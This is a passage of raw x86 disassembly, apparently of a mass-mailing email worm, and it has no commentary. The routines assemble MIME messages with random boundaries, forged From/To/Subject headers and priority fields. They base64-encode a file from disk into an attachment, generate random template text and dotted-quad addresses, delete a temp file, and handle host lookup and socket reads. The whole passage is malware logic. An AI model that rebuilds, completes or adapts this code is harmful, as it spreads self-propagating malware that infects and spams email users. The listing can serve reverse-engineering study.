		cmp	ds:dword_801BB0[eax*8],	0
		jnz	short loc_805E60
		xor	eax, eax

loc_805E60:				; CODE XREF: sub_805D98+C4j
		mov	edi, ds:dword_801BB4[eax*8]
		mov	al, [edi]
		test	al, al
		jz	loc_805F65
		mov	ebp, ds:lstrcpyA

loc_805E77:				; CODE XREF: sub_805D98+1C7j
		cmp	al, 24h
		jz	short loc_805E84
		mov	[esi], al
		inc	esi
		inc	edi
		jmp	loc_805F5B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805E84:				; CODE XREF: sub_805D98+E1j
		and	byte ptr [esi],	0
		inc	edi
		movsx	eax, byte ptr [edi]
		inc	edi
		cmp	eax, 66h
		jg	short loc_805EE4
		jz	short loc_805EDC
		sub	eax, 24h
		jz	short loc_805ED3
		sub	eax, 20h
		jz	short loc_805EBE
		dec	eax
		dec	eax
		jz	short loc_805EB6
		sub	eax, 0Eh
		jnz	loc_805F52
		lea	eax, [ebx+4]

loc_805EAD:				; CODE XREF: sub_805D98+124j
					; sub_805D98+14Aj
		push	eax		; lpString2

loc_805EAE:				; CODE XREF: sub_805D98+16Dj
		push	esi		; lpString1
		call	ebp ; lstrcpyA
		jmp	loc_805F52
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805EB6:				; CODE XREF: sub_805D98+107j
		lea	eax, [ebx+104h]
		jmp	short loc_805EAD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805EBE:				; CODE XREF: sub_805D98+103j
		call	sub_802E9C
		movzx	eax, ax
		push	8
		cdq
		pop	ecx
		idiv	ecx
		add	dl, 31h
		mov	[esi], dl
		jmp	short loc_805ED6
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805ED3:				; CODE XREF: sub_805D98+FEj
		mov	byte ptr [esi],	24h

loc_805ED6:				; CODE XREF: sub_805D98+139j
		and	byte ptr [esi+1], 0
		jmp	short loc_805F52
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805EDC:				; CODE XREF: sub_805D98+F9j
		lea	eax, [ebx+208h]
		jmp	short loc_805EAD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805EE4:				; CODE XREF: sub_805D98+F7j
		cmp	eax, 69h
		jz	short loc_805F07
		cmp	eax, 74h
		jz	short loc_805EFF
		cmp	eax, 77h
		jnz	short loc_805F52
		push	esi
		push	0
		call	sub_802DB3
		pop	ecx
		pop	ecx
		jmp	short loc_805F52
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805EFF:				; CODE XREF: sub_805D98+154j
		push	dword ptr [ebx+204h]
		jmp	short loc_805EAE
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805F07:				; CODE XREF: sub_805D98+14Fj
		call	sub_802E9C
		movzx	eax, ax
		cdq
		mov	ecx, 0FEh
		idiv	ecx
		inc	edx
		push	edx
		call	sub_802E9C
		and	eax, 0FFh
		push	eax
		call	sub_802E9C
		and	eax, 0FFh
		push	eax
		call	sub_802E9C
		movzx	eax, ax
		cdq
		mov	ecx, 0DCh
		idiv	ecx
		add	edx, 3
		push	edx
		push	offset aD_D_D_D	; LPCSTR
		push	esi		; LPSTR
		call	ds:wsprintfA
		add	esp, 18h

loc_805F52:				; CODE XREF: sub_805D98+10Cj
					; sub_805D98+119j ...
		push	esi		; lpString
		call	ds:lstrlenA
		add	esi, eax

loc_805F5B:				; CODE XREF: sub_805D98+E7j
		mov	al, [edi]
		test	al, al
		jnz	loc_805E77

loc_805F65:				; CODE XREF: sub_805D98+D3j
		and	byte ptr [esi],	0

loc_805F68:				; CODE XREF: sub_805D98+7Cj
		pop	edi
		pop	esi
		pop	ebp
		retn
sub_805D98	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805F6C	proc near		; CODE XREF: sub_805FD0+91p
					; sub_805FD0+11Ap

var_44		= dword	ptr -44h

		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		push	esi
		push	edi
		push	10h
		mov	esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
		pop	ecx
		lea	edi, [ebp+var_44]
		rep movsd
		movzx	ecx, byte ptr [eax]
		shr	ecx, 2
		movsb
		mov	cl, byte ptr [ebp+ecx+var_44]
		pop	edi
		mov	[edx], cl
		mov	cl, [eax]
		movzx	esi, byte ptr [eax+1]
		and	ecx, 3
		shl	ecx, 4
		shr	esi, 4
		or	ecx, esi
		mov	cl, byte ptr [ebp+ecx+var_44]
		mov	[edx+1], cl
		mov	cl, [eax+1]
		movzx	esi, byte ptr [eax+2]
		and	ecx, 0Fh
		shl	ecx, 2
		shr	esi, 6
		or	ecx, esi
		pop	esi
		mov	cl, byte ptr [ebp+ecx+var_44]
		mov	[edx+2], cl
		mov	al, [eax+2]
		and	eax, 3Fh
		mov	al, byte ptr [ebp+eax+var_44]
		mov	[edx+3], al
		leave
		retn
sub_805F6C	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805FD0	proc near		; CODE XREF: sub_8061F8+A4p

Buffer		= dword	ptr -418h
hObject		= dword	ptr -18h
NumberOfBytesRead= dword ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 418h
		mov	eax, [ebp+arg_4]
		push	edi
		xor	edi, edi
		add	eax, 5ABh
		push	edi		; hTemplateFile
		push	edi		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	eax		; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hObject], eax
		jnz	short loc_806007
		xor	eax, eax
		inc	eax
		jmp	loc_806122
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806007:				; CODE XREF: sub_805FD0+2Dj
		push	ebx
		push	esi
		xor	esi, esi
		mov	[ebp+var_4], edi
		mov	[ebp+NumberOfBytesRead], edi
		xor	ebx, ebx
		mov	[ebp+var_10], edi

loc_806016:				; CODE XREF: sub_805FD0+89j
					; sub_805FD0+10Bj
		mov	eax, [ebp+NumberOfBytesRead]
		cmp	[ebp+var_4], eax
		jb	short loc_806044
		lea	eax, [ebp+NumberOfBytesRead]
		push	edi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		lea	eax, [ebp+Buffer]
		push	400h		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	ds:ReadFile
		cmp	[ebp+NumberOfBytesRead], edi
		jz	loc_8060E0
		mov	[ebp+var_4], edi

loc_806044:				; CODE XREF: sub_805FD0+4Cj
		mov	eax, [ebp+var_4]
		inc	esi
		inc	[ebp+var_4]
		cmp	esi, 3
		mov	al, byte ptr [ebp+eax+Buffer]
		mov	byte ptr [ebp+esi+var_10+3], al
		jnz	short loc_806016
		lea	edx, [ebp+var_8]
		lea	eax, [ebp+var_C]
		call	sub_805F6C
		xor	esi, esi

loc_806068:				; CODE XREF: sub_805FD0+F8j
		mov	eax, [ebp+arg_4]
		cmp	[eax+7B8h], edi
		jz	short loc_8060A3
		call	sub_802E9C
		movzx	eax, ax
		cdq
		mov	ecx, 190h
		idiv	ecx
		cmp	edx, 2
		jge	short loc_806091
		mov	eax, [ebp+arg_0]
		mov	byte ptr [ebx+eax], 20h
		jmp	short loc_8060A2
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806091:				; CODE XREF: sub_805FD0+B6j
		cmp	edx, 4
		jge	short loc_8060A3
		mov	eax, [ebp+arg_0]
		mov	byte ptr [ebx+eax], 0Dh
		inc	ebx
		mov	byte ptr [ebx+eax], 0Ah

loc_8060A2:				; CODE XREF: sub_805FD0+BFj
		inc	ebx

loc_8060A3:				; CODE XREF: sub_805FD0+A1j
					; sub_805FD0+C4j
		mov	eax, [ebp+arg_0]
		mov	cl, byte ptr [ebp+esi+var_8]
		mov	[ebx+eax], cl
		inc	ebx
		inc	[ebp+var_10]
		cmp	[ebp+var_10], 4Ch
		jb	short loc_8060C4
		mov	byte ptr [ebx+eax], 0Dh
		inc	ebx
		mov	[ebp+var_10], edi
		mov	byte ptr [ebx+eax], 0Ah
		inc	ebx

loc_8060C4:				; CODE XREF: sub_805FD0+E5j
		inc	esi
		cmp	esi, 4
		jb	short loc_806068
		push	3
		lea	eax, [ebp+var_C]
		push	edi
		push	eax
		call	memset
		add	esp, 0Ch
		xor	esi, esi
		jmp	loc_806016
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8060E0:				; CODE XREF: sub_805FD0+6Bj
		cmp	esi, edi
		jz	short loc_80610E
		lea	edx, [ebp+var_8]
		lea	eax, [ebp+var_C]
		call	sub_805F6C
		cmp	esi, 3
		jnb	short loc_8060F8
		mov	byte ptr [ebp+var_8+3],	3Dh

loc_8060F8:				; CODE XREF: sub_805FD0+122j
		cmp	esi, 2
		jnb	short loc_806101
		mov	byte ptr [ebp+var_8+2],	3Dh

loc_806101:				; CODE XREF: sub_805FD0+12Bj
		mov	eax, [ebp+arg_0]
		lea	esi, [ebp+var_8]
		lea	edi, [ebx+eax]
		add	ebx, 4
		movsd

loc_80610E:				; CODE XREF: sub_805FD0+112j
		mov	eax, [ebp+arg_0]
		push	[ebp+hObject]	; hObject
		and	byte ptr [ebx+eax], 0
		call	ds:CloseHandle
		pop	esi
		xor	eax, eax
		pop	ebx

loc_806122:				; CODE XREF: sub_805FD0+32j
		pop	edi
		leave
		retn
sub_805FD0	endp


;  S U B	R O U T	I N E 


sub_806125	proc near		; CODE XREF: sub_8062CA+F9p

var_4		= dword	ptr -4

		push	ecx
		push	ebx
		push	ebp
		push	esi
		push	edi
		mov	edi, eax
		mov	esi, [edi+7B4h]
		lea	ebx, [edi+6B4h]
		mov	[esp+14h+var_4], ebx
		call	sub_802EB8
		push	eax
		call	sub_802EB8
		push	eax
		call	sub_802E9C
		movzx	eax, ax
		push	0Fh
		cdq
		pop	ecx
		idiv	ecx
		push	edx
		push	0
		push	offset aNextpart ; "NextPart"
		push	offset a_S__3u__4u__8x ; LPCSTR
		push	ebx		; LPSTR
		mov	ebx, ds:wsprintfA
		call	ebx ; wsprintfA
		lea	eax, [edi+208h]
		push	eax
		push	offset aFromS	; LPCSTR
		push	esi		; LPSTR
		call	ebx ; wsprintfA
		mov	ebp, ds:lstrlenA
		add	esp, 28h
		push	dword ptr [edi+204h]
		push	offset aToS	; LPCSTR
		push	esi		; lpString
		call	ebp ; lstrlenA
		add	eax, esi
		push	eax		; LPSTR
		call	ebx ; wsprintfA
		add	esp, 0Ch
		add	edi, 308h
		push	edi
		push	offset aSubjectS ; LPCSTR
		push	esi		; lpString
		call	ebp ; lstrlenA
		add	eax, esi
		push	eax		; LPSTR
		call	ebx ; wsprintfA
		mov	edi, ds:lstrcatA
		add	esp, 0Ch
		push	offset aDate	; lpString2
		push	esi		; lpString1
		call	edi ; lstrcatA
		push	esi		; lpString
		call	ebp ; lstrlenA
		add	eax, esi
		push	eax
		push	0
		call	sub_802DB3
		pop	ecx
		pop	ecx
		push	offset aMimeVersion1_0 ; lpString2
		push	esi		; lpString1
		call	edi ; lstrcatA
		push	[esp+14h+var_4]
		push	offset aContentTypeMul ; LPCSTR
		push	esi		; lpString
		call	ebp ; lstrlenA
		add	eax, esi
		push	eax		; LPSTR
		call	ebx ; wsprintfA
		add	esp, 0Ch
		push	offset aXPriority3XMsm ; lpString2
		push	esi		; lpString1
		call	edi ; lstrcatA
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		pop	ecx
		retn
sub_806125	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8061F8	proc near		; CODE XREF: sub_8062CA+104p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, eax
		push	esi
		mov	esi, ds:lstrlenA
		push	edi
		mov	edi, [ebx+7B4h]
		push	offset aThisIsAMultiPa ; LPCSTR
		push	edi		; lpString
		call	esi ; lstrlenA
		add	eax, edi
		push	eax		; LPSTR
		call	ds:wsprintfA
		pop	ecx
		lea	eax, [ebx+6B4h]
		pop	ecx
		push	eax
		push	offset aSContentTypeTe ; LPCSTR
		push	edi		; lpString
		call	esi ; lstrlenA
		add	eax, edi
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		push	edi		; lpString
		call	esi ; lstrlenA
		add	eax, edi
		call	sub_805D98
		push	offset asc_80254C ; lpString2
		push	edi		; lpString1
		call	ds:lstrcatA
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		mov	ecx, offset aAttachment	; "attachment"
		cmp	edx, 5Fh
		jl	short loc_80626E
		mov	ecx, offset aInline ; "inline"

loc_80626E:				; CODE XREF: sub_8061F8+6Fj
		lea	eax, [ebx+4ABh]
		push	eax
		push	ecx
		push	eax
		lea	eax, [ebx+6B4h]
		push	eax
		push	offset aSContentTypeAp ; LPCSTR
		push	edi		; lpString
		mov	[ebp+var_4], eax
		call	esi ; lstrlenA
		add	eax, edi
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 18h
		push	ebx
		push	edi		; lpString
		call	esi ; lstrlenA
		add	eax, edi
		push	eax
		call	sub_805FD0
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_8062AC
		xor	eax, eax
		inc	eax
		jmp	short loc_8062C5
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8062AC:				; CODE XREF: sub_8061F8+ADj
		push	[ebp+var_4]
		push	offset aS	; LPCSTR
		push	edi		; lpString
		call	esi ; lstrlenA
		add	eax, edi
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		xor	eax, eax

loc_8062C5:				; CODE XREF: sub_8061F8+B2j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_8061F8	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8062CA	proc near		; CODE XREF: sub_80446C+45p

var_7C0		= dword	ptr -7C0h
var_7BC		= dword	ptr -7BCh
var_5BC		= dword	ptr -5BCh
var_316		= byte ptr -316h
FileName	= byte ptr -215h
var_110		= dword	ptr -110h
hMem		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lpString	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 7C0h
		push	ebx
		push	edi
		mov	edi, [ebp+lpString]
		xor	ebx, ebx
		cmp	edi, ebx
		jz	loc_8063FA
		push	edi		; lpString
		call	ds:lstrlenA
		cmp	eax, 7
		jl	loc_8063FA
		push	esi
		push	7C0h
		lea	eax, [ebp+var_7C0]
		push	ebx
		push	eax
		call	memset
		add	esp, 0Ch
		mov	[ebp+var_7C0], ebx
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		xor	esi, esi
		cdq
		pop	ecx
		inc	esi
		idiv	ecx
		cmp	edx, 46h
		jge	short loc_80632A
		mov	[ebp+var_7C0], esi

loc_80632A:				; CODE XREF: sub_8062CA+58j
		mov	[ebp+var_8], ebx
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 32h
		jge	short loc_806343
		mov	[ebp+var_8], esi

loc_806343:				; CODE XREF: sub_8062CA+74j
		lea	eax, [ebp+var_7BC]
		push	edi
		push	eax
		mov	[ebp+var_5BC], edi
		call	sub_805551
		pop	ecx
		lea	eax, [ebp+var_7C0]
		pop	ecx
		call	sub_805575
		lea	eax, [ebp+var_7C0]
		call	sub_805729
		lea	eax, [ebp+var_7C0]
		call	sub_8058E5
		lea	esi, [ebp+var_7C0]
		call	sub_805AA7
		test	eax, eax
		pop	esi
		jnz	short loc_8063FA
		mov	eax, [ebp+var_110]
		push	3
		shl	eax, 2
		cdq
		pop	ecx
		idiv	ecx
		mov	ecx, 400h
		add	eax, 239Fh
		cdq
		idiv	ecx
		shl	eax, 0Ah
		push	eax		; dwBytes
		push	40h		; uFlags
		mov	[ebp+var_4], eax
		call	ds:GlobalAlloc
		cmp	eax, ebx
		mov	[ebp+hMem], eax
		jz	short loc_8063D7
		mov	[eax], bl
		lea	eax, [ebp+var_7C0]
		call	sub_806125
		lea	eax, [ebp+var_7C0]
		call	sub_8061F8
		test	eax, eax
		jz	short loc_8063FE

loc_8063D7:				; CODE XREF: sub_8062CA+EFj
		cmp	[ebp+var_316], bl
		jz	short loc_8063EC
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ds:DeleteFileA

loc_8063EC:				; CODE XREF: sub_8062CA+113j
		cmp	[ebp+hMem], ebx
		jz	short loc_8063FA
		push	[ebp+hMem]	; hMem
		call	ds:GlobalFree

loc_8063FA:				; CODE XREF: sub_8062CA+12j
					; sub_8062CA+22j ...
		xor	eax, eax
		jmp	short loc_806416
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8063FE:				; CODE XREF: sub_8062CA+10Bj
		cmp	[ebp+var_316], bl
		jz	short loc_806413
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ds:DeleteFileA

loc_806413:				; CODE XREF: sub_8062CA+13Aj
		mov	eax, [ebp+hMem]

loc_806416:				; CODE XREF: sub_8062CA+132j
		pop	edi
		pop	ebx
		leave
		retn
sub_8062CA	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80641A	proc near		; CODE XREF: sub_8066C8+8Cp

readfds		= fd_set ptr -114h
timeout		= timeval ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
s		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 114h
		push	ebx
		push	esi
		xor	esi, esi
		xor	ebx, ebx
		inc	esi
		push	edi
		cmp	[ebp+arg_8], esi
		mov	[ebp+var_4], ebx
		jle	short loc_8064A4
		mov	edi, [ebp+arg_4]
		mov	[ebp+var_8], esi
		sub	[ebp+var_8], edi

loc_80643C:				; CODE XREF: sub_80641A+88j
		mov	eax, [ebp+arg_C]
		cmp	eax, ebx
		jz	short loc_80647E
		mov	ecx, [ebp+s]
		mov	[ebp+readfds.fd_count],	esi
		mov	[ebp+readfds.fd_array],	ecx
		mov	ecx, 3E8h
		cdq
		idiv	ecx
		imul	edx, 3E8h
		mov	[ebp+timeout.tv_sec], eax
		lea	eax, [ebp+timeout]
		push	eax		; timeout
		push	ebx		; exceptfds
		lea	eax, [ebp+readfds]
		push	ebx		; writefds
		push	eax		; readfds
		push	ebx		; nfds
		mov	[ebp+timeout.tv_usec], edx
		call	ds:select
		test	eax, eax
		jle	short loc_8064A4

loc_80647E:				; CODE XREF: sub_80641A+27j
		push	ebx		; flags
		push	esi		; len
		push	edi		; buf
		push	[ebp+s]		; s
		call	ds:recv
		cmp	eax, ebx
		jl	short loc_8064B2
		jz	short loc_8064A4
		mov	al, [edi]
		inc	[ebp+var_4]
		inc	edi
		cmp	al, 0Ah
		jz	short loc_8064A4
		mov	eax, [ebp+var_8]
		add	eax, edi
		cmp	eax, [ebp+arg_8]
		jl	short loc_80643C

loc_8064A4:				; CODE XREF: sub_80641A+17j
					; sub_80641A+62j ...
		mov	ecx, [ebp+arg_4]
		mov	eax, [ebp+var_4]
		mov	[eax+ecx], bl

loc_8064AD:				; CODE XREF: sub_80641A+9Bj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8064B2:				; CODE XREF: sub_80641A+72j
		or	eax, 0FFFFFFFFh
		jmp	short loc_8064AD
sub_80641A	endp


;  S U B	R O U T	I N E 


sub_8064B7	proc near		; CODE XREF: sub_8069EA+F0p
					; sub_806B4F+80p ...
		push	esi
		push	edi		; cp
		call	ds:inet_addr
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jz	short loc_8064CF
		test	esi, esi
		jnz	short loc_8064E1
		cmp	byte ptr [edi],	30h
		jz	short loc_8064E8

loc_8064CF:				; CODE XREF: sub_8064B7+Dj
		push	edi		; name
		call	ds:gethostbyname
		test	eax, eax
		jz	short loc_8064E1
		mov	eax, [eax+0Ch]
		mov	eax, [eax]
		mov	esi, [eax]

loc_8064E1:				; CODE XREF: sub_8064B7+11j
					; sub_8064B7+21j
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_8064E8
		xor	esi, esi

loc_8064E8:				; CODE XREF: sub_8064B7+16j
					; sub_8064B7+2Dj
		mov	eax, esi
		pop	esi
		retn
sub_8064B7	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8064EC	proc near		; CODE XREF: sub_806765+1Fp
					; sub_806765+47p ...

var_102		= byte ptr -102h
String1		= byte ptr -100h
lpString2	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 100h
		push	ebx
		push	esi
		mov	esi, eax
		xor	eax, eax
		cmp	esi, eax
		push	edi
		jz	loc_806667
		cmp	[ebp+lpString2], eax
		jz	loc_806667
		cmp	[ebp+arg_4], eax
		jz	loc_806667
		cmp	[ebp+arg_8], eax
		jle	loc_806667

loc_80651F:				; CODE XREF: sub_8064EC+46j
		mov	al, [esi]
		cmp	al, 0Dh
		jz	short loc_806531
		cmp	al, 0Ah
		jz	short loc_806531
		cmp	al, 20h
		jz	short loc_806531
		cmp	al, 9
		jnz	short loc_806534

loc_806531:				; CODE XREF: sub_8064EC+37j
					; sub_8064EC+3Bj ...
		inc	esi
		jmp	short loc_80651F
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806534:				; CODE XREF: sub_8064EC+43j
		cmp	byte ptr [esi],	0
		jz	loc_806667
		mov	ebx, ds:lstrlenA

loc_806543:				; CODE XREF: sub_8064EC+175j
		xor	ecx, ecx

loc_806545:				; CODE XREF: sub_8064EC+89j
					; sub_8064EC+99j
		mov	al, [esi]
		inc	esi
		test	al, al
		jz	short loc_80658A
		cmp	al, 3Ah
		jz	short loc_806589
		cmp	al, 0Dh
		jz	short loc_806589
		cmp	al, 0Ah
		jz	short loc_806589
		cmp	al, 9
		jnz	short loc_80655E
		add	al, 17h

loc_80655E:				; CODE XREF: sub_8064EC+6Ej
		test	ecx, ecx
		jle	short loc_806571
		cmp	al, 20h
		jnz	short loc_80656F
		cmp	[ebp+ecx-101h],	al
		jz	short loc_80657F

loc_80656F:				; CODE XREF: sub_8064EC+78j
		test	ecx, ecx

loc_806571:				; CODE XREF: sub_8064EC+74j
		jnz	short loc_806577
		cmp	al, 20h
		jz	short loc_806545

loc_806577:				; CODE XREF: sub_8064EC:loc_806571j
		mov	[ebp+ecx+String1], al
		inc	ecx

loc_80657F:				; CODE XREF: sub_8064EC+81j
		cmp	ecx, 0FFh
		jb	short loc_806545
		jmp	short loc_80658A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806589:				; CODE XREF: sub_8064EC+62j
					; sub_8064EC+66j ...
		dec	esi

loc_80658A:				; CODE XREF: sub_8064EC+5Ej
					; sub_8064EC+9Bj
		and	[ebp+ecx+String1], 0
		cmp	byte ptr [esi],	0
		jz	loc_806667
		lea	eax, [ebp+String1]
		lea	edi, [ebp+String1]
		push	eax		; lpString
		dec	edi
		call	ebx ; lstrlenA
		cmp	byte ptr [eax+edi], 20h
		jnz	short loc_8065BE
		lea	eax, [ebp+String1]
		push	eax		; lpString
		call	ebx ; lstrlenA
		and	byte ptr [eax+edi], 0

loc_8065BE:				; CODE XREF: sub_8064EC+C3j
		cmp	[ebp+String1], 0
		jz	loc_806667
		cmp	byte ptr [esi],	3Ah
		jnz	short loc_806631
		lea	eax, [ebp+String1]
		push	eax		; lpsz
		call	ds:CharLowerA
		push	[ebp+lpString2]	; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcmpiA
		test	eax, eax
		jnz	short loc_806631
		inc	esi
		mov	al, [esi]
		cmp	al, 20h
		jz	short loc_8065FC
		cmp	al, 9
		jnz	short loc_8065FD

loc_8065FC:				; CODE XREF: sub_8064EC+10Aj
		inc	esi

loc_8065FD:				; CODE XREF: sub_8064EC+10Ej
		mov	edi, [ebp+arg_8]
		xor	edx, edx
		dec	edi
		test	edi, edi
		jle	short loc_80661D

loc_806607:				; CODE XREF: sub_8064EC+12Fj
		mov	al, [esi]
		inc	esi
		cmp	al, 0Dh
		jz	short loc_80666F
		cmp	al, 0Ah
		jz	short loc_80666F
		mov	ecx, [ebp+arg_4]
		mov	[edx+ecx], al
		inc	edx

loc_806619:				; CODE XREF: sub_8064EC+1A7j
		cmp	edx, edi
		jl	short loc_806607

loc_80661D:				; CODE XREF: sub_8064EC+119j
					; sub_8064EC+19Dj
		mov	eax, [ebp+arg_4]
		and	byte ptr [edx+eax], 0
		xor	eax, eax
		jmp	short loc_80666A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806628:				; CODE XREF: sub_8064EC+149j
		cmp	al, 0Dh
		jz	short loc_806637
		test	al, al
		jz	short loc_806667
		inc	esi

loc_806631:				; CODE XREF: sub_8064EC+E2j
					; sub_8064EC+103j
		mov	al, [esi]
		cmp	al, 0Ah
		jnz	short loc_806628

loc_806637:				; CODE XREF: sub_8064EC+13Ej
		mov	al, [esi]
		test	al, al
		jz	short loc_806667
		cmp	al, 0Ah
		jnz	short loc_806649
